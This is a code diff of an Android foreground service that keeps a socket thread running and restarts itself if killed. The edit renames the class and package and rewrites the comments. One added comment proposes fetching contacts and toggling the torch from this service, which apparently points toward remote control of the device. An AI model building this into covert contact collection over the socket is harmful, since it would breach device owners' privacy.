@@ -1,4 +1,4 @@
-package com.you.myapplication;
+package com.you.app;
 
 import android.app.Notification;
 import android.app.NotificationChannel;
@@ -7,7 +7,7 @@ import android.app.Service;
 import android.content.Intent;
 import android.os.IBinder;
 
-public class KeepAliveService extends Service {
+public class KeepServiceAlive extends Service {
 
     private static final String CHANNEL_ID = "keep_alive";
     private Thread socketThread;
@@ -15,7 +15,8 @@ public class KeepAliveService extends Service {
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
 
-        // 🔥 ANDROID KO PEHLE BATAO (notification)
+        // 1️⃣ Notification setup for foreground service
+        // Android requires foreground service to show a notification
         if (android.os.Build.VERSION.SDK_INT >= 26) {
 
             NotificationChannel channel = new NotificationChannel(
@@ -28,25 +29,29 @@ public class KeepAliveService extends Service {
             nm.createNotificationChannel(channel);
 
             Notification notification = new Notification.Builder(this, CHANNEL_ID)
-                    .setContentTitle("Service running")
-                    .setContentText("Maintaining connection")
+                    .setContentTitle("Service Running")
+                    .setContentText("Maintaining background connection")
                     .setSmallIcon(R.mipmap.ic_launcher)
                     .build();
 
             startForeground(1, notification);
         }
 
-        // 🔥 AB SOCKET START KARO
+        // 2️⃣ Start the socket thread (AppThread)
+        // 🌟 Future features: You can pass parameters here if needed
         if (socketThread == null) {
-            socketThread = new AppThread();
+            socketThread = new AppThread(); // ⚠️ AppThread code remains same
             socketThread.start();
         }
 
-        return START_STICKY;
+        return START_STICKY; // Service restarts if killed
     }
 
     @Override
     public IBinder onBind(Intent intent) {
-        return null;
+        return null; // No binding needed
     }
+
+    // 🔹 Future helper functions can go here
+    // Example: you can create torch toggle, fetch contacts etc. from here
 }
